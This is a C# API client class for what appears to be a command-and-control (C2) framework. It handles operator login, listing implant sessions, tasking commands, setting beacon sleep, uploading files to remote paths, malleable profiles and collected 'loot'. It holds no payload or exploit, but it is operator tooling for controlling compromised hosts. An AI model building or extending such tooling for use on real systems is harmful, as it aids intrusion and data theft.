using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;
using C2Dect.Lite.Models;

namespace C2Dect.Lite.Services;

public class ApiService
{
    private readonly HttpClient _http;
    private string? _baseUrl;
    private string? _token;

    public string? BaseUrl
    {
        get => _baseUrl;
        set => _baseUrl = value?.TrimEnd('/');
    }

    public ApiService()
    {
        _http = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
    }

    public void Configure(string baseUrl, string token)
    {
        _baseUrl = baseUrl.TrimEnd('/');
        _token = token;
        _http.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
    }

    public bool IsConfigured => !string.IsNullOrEmpty(_token);
    public string? Token => _token;

    private string Url(string path) => $"{_baseUrl}{path}";

    private async Task<T?> Get<T>(string path)
    {
        var resp = await _http.GetAsync(Url(path));
        if (!resp.IsSuccessStatusCode) return default;
        var json = await resp.Content.ReadAsStringAsync();
        return JsonConvert.DeserializeObject<T>(json);
    }

    private async Task<T?> Post<T>(string path, object? body = null)
    {
        var content = body != null
            ? new StringContent(JsonConvert.SerializeObject(body), Encoding.UTF8, "application/json")
            : null;
        var resp = await _http.PostAsync(Url(path), content);
        if (!resp.IsSuccessStatusCode) return default;
        var json = await resp.Content.ReadAsStringAsync();
        return JsonConvert.DeserializeObject<T>(json);
    }

    private async Task<T?> Put<T>(string path, object body)
    {
        var content = new StringContent(JsonConvert.SerializeObject(body), Encoding.UTF8, "application/json");
        var resp = await _http.PutAsync(Url(path), content);
        if (!resp.IsSuccessStatusCode) return default;
        var json = await resp.Content.ReadAsStringAsync();
        return JsonConvert.DeserializeObject<T>(json);
    }

    private async Task<bool> Delete(string path)
    {
        var resp = await _http.DeleteAsync(Url(path));
        return resp.IsSuccessStatusCode;
    }

    // Auth
    public async Task<(string token, Operator? op)?> Login(string username, string password)
    {
        var resp = await Post<LoginResponse>("/api/auth/login",
            new { username, password });
        if (resp?.Token == null) return null;
        return (resp.Token, resp.Operator);
    }

    public async Task<bool> Register(string username, string password, string role = "operator")
    {
        var resp = await Post<object>("/api/auth/register",
            new { username, password, role });
        return resp != null;
    }

    // Sessions
    public async Task<List<Session>?> GetSessions(string? status = null)
    {
        var path = status != null ? $"/api/sessions?status={status}" : "/api/sessions";
        var resp = await Get<SessionsResponse>(path);
        return resp?.Sessions;
    }

    public async Task<Session?> GetSession(string id)
        => await Get<Session>($"/api/sessions/{id}");

    public async Task<bool> TagSession(string id, string tags)
        => await Put<object>($"/api/sessions/{id}/tag", new { tags }) != null;

    public async Task<bool> SetSleep(string id, int sec)
        => await Put<object>($"/api/sessions/{id}/sleep", new { sleep_sec = sec }) != null;

    public async Task<bool> KillSession(string id)
        => await Delete($"/api/sessions/{id}");

    // Tasks
    public async Task<C2Task?> SubmitTask(string sessionId, string command, string args = "")
    {
        return await Post<C2Task>($"/api/sessions/{sessionId}/task",
            new { command, args });
    }

    public async Task<List<C2Task>?> GetTasks(string sessionId)
    {
        var resp = await Get<TasksResponse>($"/api/sessions/{sessionId}/tasks");
        return resp?.Tasks;
    }

    // Upload
    public async Task<bool> UploadFile(string sessionId, string remotePath, byte[] data)
    {
        using var content = new MultipartFormDataContent();
        var fileContent = new ByteArrayContent(data);
        content.Add(fileContent, "file", System.IO.Path.GetFileName(remotePath));
        content.Add(new StringContent(remotePath), "remote_path");
        var resp = await _http.PostAsync(Url($"/api/sessions/{sessionId}/upload"), content);
        return resp.IsSuccessStatusCode;
    }

    // Profiles
    public async Task<List<MalleableProfile>?> GetProfiles()
    {
        var resp = await Get<ProfilesResponse>("/api/profiles");
        return resp?.Profiles;
    }

    public async Task<MalleableProfile?> CreateProfile(MalleableProfile profile)
        => await Post<MalleableProfile>("/api/profiles", profile);

    // Loot
    public async Task<List<Loot>?> GetLoot(string? sessionId = null)
    {
        var path = sessionId != null ? $"/api/loot?session_id={sessionId}" : "/api/loot";
        var resp = await Get<LootResponse>(path);
        return resp?.Loot;
    }

    // Stats
    public async Task<DashboardStats?> GetStats()
        => await Get<DashboardStats>("/api/stats");

    // Session cleanup
    public async Task<string> DeleteAllSessions()
    {
        var resp = await _http.DeleteAsync(Url("/api/sessions"));
        var json = await resp.Content.ReadAsStringAsync();
        return json;
    }

    public async Task<string> CleanupStaleSessions(int maxAgeMinutes)
    {
        var resp = await _http.PostAsync(Url("/api/sessions/cleanup"),
            new StringContent(JsonConvert.SerializeObject(new { max_age_minutes = maxAgeMinutes }),
                Encoding.UTF8, "application/json"));
        var json = await resp.Content.ReadAsStringAsync();
        return json;
    }

    // Response models
    private class LoginResponse { public string? Token { get; set; } public Operator? Operator { get; set; } }
    private class SessionsResponse { public List<Session>? Sessions { get; set; } }
    private class TasksResponse { public List<C2Task>? Tasks { get; set; } }
    private class ProfilesResponse { public List<MalleableProfile>? Profiles { get; set; } }
    private class LootResponse { public List<Loot>? Loot { get; set; } }
}
